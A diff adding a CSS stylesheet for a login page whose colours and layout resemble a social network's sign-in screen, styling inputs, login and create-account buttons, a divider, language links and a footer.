@@ -1,0 +1,121 @@
+body{
+    margin: 0px;
+    padding: 0px;
+    box-sizing: border-box;
+}
+#form_wrapper {
+    width: 100%;
+    margin: 0px auto;
+}
+#form_wrapper h1 {
+    font-size: 35px;
+    color: #1b33b5;
+    margin: 12px 0px;
+    text-align: center;
+    font-family: sans-serif;
+}
+#form_wrapper input,.login{
+    width: 80%;
+    height: 44px;
+    background: #f5f6f7;
+    margin: 4px 10%;
+    border: 1px solid #d1d1d1;
+    padding: 12px;
+    border-radius: 5px;
+}
+#items li {
+    text-align: center;
+    list-style: none;
+}
+#items li a {
+    text-decoration: none;
+}
+.forget_password {
+    color: #216fdb;
+    font-size: 14px;
+    line-height: 16px;
+    font-family: 'Roboto-Regular', 'Helvetica', 'sans-serif';
+}
+.login{
+    background: #1877f2 !important;
+    color: white;
+    font-size: 16px;
+    font-weight: bold;
+}
+.create {
+    color: #fff;
+    border-radius: 4px;
+    background: #00a400;
+    padding: 10px 20px;
+    height: 36px !important;
+    font-size: 14px;
+    font-weight: 600;
+    font-family: Helvetica, Arial, sans-serif;
+}
+.or {
+    padding-bottom: 20px;
+    position: relative;
+}
+.or:after {
+    content: '';
+    height: 1px;
+    border-bottom: 1px solid #cdcdcd;
+    width: 25%;
+    position: absolute;
+    top: 23%;
+    right: 21%;
+}
+.or:before {
+    content: '';
+    height: 1px;
+    border-bottom: 1px solid #cdcdcd;
+    width: 25%;
+    margin-left: 10%;
+    left: 11%;
+    position: absolute;
+    top: 23%;
+}
+#language {
+    display: flex;
+    width: 80%;
+    margin-top: 100px;
+}
+.left_group {
+    float: left;
+    margin-right: 20%;
+    margin-left: 6%;
+}
+.right_group {
+    float: right;
+}
+.left_group li, .right_group li {
+    list-style: none;
+    font-size: 14px;
+    color: #333378;
+}
+.about_section ul{
+    text-align: center;
+    display: flex;
+}
+.about_section ul{
+    box-sizing: border-box;
+    list-style: none;
+}
+.about_section ul li a {
+    text-decoration: none;
+    color: #333378;
+    margin: 0px 8px;
+}
+.about_section {
+    width: 220px;
+    margin: auto;
+}
+.copyright {
+    text-align: center;
+    margin: -40px 0px 0px 0px;
+}
+#statusText {
+    margin-left: 10%;
+    color: red;
+    display: none;
+}
